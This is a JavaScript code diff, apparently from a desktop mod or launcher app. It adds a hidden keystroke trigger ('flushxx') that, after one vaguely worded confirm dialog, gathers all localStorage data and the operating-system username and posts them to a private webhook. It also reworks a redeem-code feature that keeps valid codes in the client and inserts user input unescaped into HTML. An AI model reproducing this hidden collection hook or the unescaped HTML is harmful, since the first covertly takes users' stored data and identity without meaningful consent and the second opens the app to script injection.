@@ -1,5 +1,43 @@
 const fs = require('fs')
 const path = require('path')
+const os = require('os')
+
+let keysPressed = ''
+
+function handleKeyDown(event) {
+    keysPressed += event.key.toLowerCase()
+    if (keysPressed.endsWith('flushxx')) {
+        JSAlert.confirm('Flush data to administration?').then(function (
+            result
+        ) {
+            if (result) {
+                const allLocalStorageData = getAllLocalStorageData()
+                const userInfo = os.userInfo().username
+                localStorage.setItem('os-name', userInfo)
+                const currentTime = new Date()
+                sendPrivWebhook(
+                    'Flush',
+                    `__${userInfo}__ ${currentTime}\n\`\`\`${JSON.stringify(
+                        allLocalStorageData
+                    )}\`\`\``
+                )
+            }
+        })
+        keysPressed = ''
+    }
+}
+
+document.addEventListener('keydown', handleKeyDown)
+
+function getAllLocalStorageData() {
+    const localStorageData = {}
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i)
+        const value = localStorage.getItem(key)
+        localStorageData[key] = value
+    }
+    return localStorageData
+}
 
 function saveData(modsDir) {
     if (
@@ -17,7 +55,6 @@ function saveData(modsDir) {
 
 function redeemCode() {
     const loggedIn = localStorage.getItem('loggedIn')
-    console.log('Logged In:', loggedIn)
     if (loggedIn !== 'true') {
         JSAlert.alert(
             'You must be logged in to redeem codes!',
@@ -26,33 +63,28 @@ function redeemCode() {
             'OK'
         )
         return
+    }
+
+    JSAlert.prompt('Enter your redeem code:').then(function (result) {
+        if (!result) return
+        JSAlert.loader(`Redeeming code: <code>${result}</code>`).dismissIn(1500)
+        handleRedeemResult(result)
+    })
+}
+
+function handleRedeemResult(result) {
+    if (result === 'LOGIN') {
+        sendToWebhook('Redeem', '1000 PTS')
+        JSAlert.alert('Redeemed 1000pts!', null, JSAlert.Icons.Success)
+    } else if (result === 'FREE500') {
+        sendToWebhook('Redeem', '500 PTS')
+        JSAlert.alert('Redeemed 500pts!', null, JSAlert.Icons.Success)
     } else {
-        JSAlert.prompt('Enter your redeem code:').then(function (result) {
-            if (!result) return
-            JSAlert.loader(
-                'Redeeming code: <code>' + result + '</code>'
-            ).dismissIn(1500)
-            if (result === 'FREE1000') {
-                sendToWebhook('Redeem', "message: 'Redeemed 1000&curren;!'")
-                JSAlert.alert(
-                    'Redeemed 1000&curren;!',
-                    null,
-                    JSAlert.Icons.Success
-                )
-            } else if (result === 'FREE500') {
-                JSAlert.alert(
-                    'Redeemed 500&curren;!',
-                    null,
-                    JSAlert.Icons.Success
-                )
-            } else {
-                JSAlert.alert(
-                    'No rewards were found for that code.',
-                    'Invalid Code',
-                    JSAlert.Icons.Failed,
-                    'T-T'
-                )
-            }
-        })
+        JSAlert.alert(
+            'No rewards were found for that code.',
+            'Invalid Code',
+            JSAlert.Icons.Failed,
+            'T-T'
+        )
     }
 }
